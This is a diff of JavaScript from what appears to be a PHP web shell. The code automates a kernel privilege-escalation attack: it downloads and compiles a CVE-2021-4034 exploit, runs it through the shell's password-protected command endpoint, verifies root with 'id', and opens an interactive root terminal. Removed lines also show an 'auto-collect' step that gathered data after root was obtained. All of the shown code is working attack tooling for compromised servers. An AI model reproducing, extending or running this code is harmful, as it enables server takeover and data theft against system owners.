     const outputDiv = document.getElementById('privescOutput');
     const statusDiv = document.getElementById('privescStatus');
     
     outputDiv.style.display = 'block';
-    outputDiv.innerHTML = '<span style="color:#6cf;">[KERNEL AUTO-COMPILE] Starting...</span>\n';
+    outputDiv.innerHTML = '<span style="color:#6cf;">[KERNEL AUTO-COMPILE] Checking kernel version and CVE database...</span>\n';
     statusDiv.style.display = 'block';
-    statusDiv.innerHTML = '⏳ Phase 0/4: Cleaning up old files...';
-    
-    // 🧹 CLEANUP: Hapus file exploit lama sebelum mulai
-    await cleanupOldExploitFiles();
-    outputDiv.innerHTML += '<span style="color:#888;">🧹 Cleaned up old exploit files</span>\n';
-    
-    statusDiv.innerHTML = '⏳ Phase 1/4: Detecting kernel version...';
+    statusDiv.innerHTML = '⏳ Phase 1/3: Detecting kernel version...';
     
     try {
         // Get kernel version
@@ -7887,7 +7316,7 @@ async function kernelAutoCompile() {
         
         // Let user choose or auto-select based on kernel version
         let targetCve = 'CVE-2021-4034'; // default most reliable
-        statusDiv.innerHTML = '⏳ Phase 2/4: Downloading and compiling ' + targetCve + '...';
+        statusDiv.innerHTML = '⏳ Phase 2/3: Downloading and compiling ' + targetCve + '...';
         outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Auto-compiling ' + targetCve + '...</span>\n';
         
         const formData = new FormData();
@@ -7904,38 +7333,46 @@ async function kernelAutoCompile() {
             outputDiv.innerHTML += '<span style="color:#6cf;">Path: ' + data.compiled_binary + '</span>\n';
             outputDiv.innerHTML += '\n<span style="color:#ff0;">Output:</span>\n' + data.output + '\n';
             
-            statusDiv.innerHTML = '⏳ Phase 3/4: Executing exploit with auto-collect...';
+            statusDiv.innerHTML = '⏳ Phase 3/3: Executing exploit...';
             
-            // 🎯 Gunakan kernel_exploit_auto_collect untuk eksekusi + auto-collect!
-            const kernelForm = new FormData();
-            kernelForm.append('action', 'kernel_exploit_auto_collect');
-            kernelForm.append('binary', data.compiled_binary);
-            kernelForm.append('method', data.method || 'binary');
+            // Execute based on method type
+            let execCmd = data.compiled_binary;
+            if (data.method === 'python') {
+                execCmd = 'python3 ' + data.compiled_binary + ' || python ' + data.compiled_binary;
+            }
             
-            const kernelResp = await fetch('', { method: 'POST', body: kernelForm });
-            const kernelData = await kernelResp.json();
+            const execForm = new FormData();
+            execForm.append('cmd', execCmd);
+            execForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            
+            const execResponse = await fetch('', { method: 'POST', body: execForm });
+            const execHtml = await execResponse.text();
             
             outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Exploit execution result:</span>\n';
-            outputDiv.innerHTML += (kernelData.output || 'No output').substring(0, 2000);
+            outputDiv.innerHTML += execHtml.substring(0, 2000);
             
-            if (kernelData.success && kernelData.collected) {
-                // 🎉 ROOT + AUTO-COLLECT SUCCESS!
-                statusDiv.innerHTML = '✅ Phase 4/4: ROOT CONFIRMED via ' + targetCve;
-                outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED! (Verified + Auto-Collect)</span>\n';
+            // Verify root with strict checks
+            const verifyForm = new FormData();
+            verifyForm.append('cmd', 'id');
+            verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            const verifyResponse = await fetch('', { method: 'POST', body: verifyForm });
+            const verifyHtml = await verifyResponse.text();
+            
+            // Strict check: must contain exact string 'uid=0(root)'
+            const isReallyRoot = verifyHtml.includes('uid=0(root)');
+            
+            if (isReallyRoot) {
+                outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED! (Verified)</span>\n';
                 outputDiv.innerHTML += '<span style="color:#0f0;">uid=0(root) confirmed</span>\n';
-                outputDiv.innerHTML += '<span style="color:#0f0;">🎯 Auto-collected ' + (kernelData.summary || 'critical data') + '</span>\n';
+                outputDiv.innerHTML += '\n<span style="color:#0f0;">✅ Interactive Root Terminal activated below!</span>\n';
                 statusDiv.className = 'privesc-status success';
-                
-                // Store collected data
-                window.lastCollectedRootData = kernelData.collected;
-                window.lastCollectedSummary = kernelData.summary;
-                window.lastCollectedPaths = kernelData.saved_to;
+                statusDiv.innerHTML = '✅ ROOT OBTAINED via ' + targetCve + ' (No persistence)';
                 
                 // 🎯 TAMPILKAN INTERACTIVE ROOT TERMINAL
                 showRootTerminal();
             } else {
                 outputDiv.innerHTML += '\n\n<span style="color:#f44;">[!] Exploit ran but no root access</span>\n';
-                outputDiv.innerHTML += '<span style="color:#888;">Stage: ' + (kernelData.stage || 'unknown') + '</span>\n';
+                outputDiv.innerHTML += '<span style="color:#888;">Current user: ' + verifyHtml.substring(0, 200) + '</span>\n';
                 outputDiv.innerHTML += '<span style="color:#ff0;">💡 Tips: Try running exploit manually or check if system is patched</span>\n';
                 statusDiv.innerHTML = '⚠️ Exploit executed but no root (False Positive)';
             }
@@ -8399,9 +7836,7 @@ function showRootTerminal() {
     terminal.style.display = 'block';
     
     // 🎯 Check if we have auto-collected data
-    const hasAutoCollect = window.lastCollectedRootData && 
-                          typeof window.lastCollectedRootData === 'object' &&
-                          Object.keys(window.lastCollectedRootData).length > 0;
+    const hasAutoCollect = window.lastCollectedRootData && window.lastCollectedSummary;
     
     let html = `<span style="color:#0f0;font-weight:bold;">🎉 ROOT ACCESS GRANTED!</span>
 <span style="color:#888;">═══════════════════════════════════════</span>
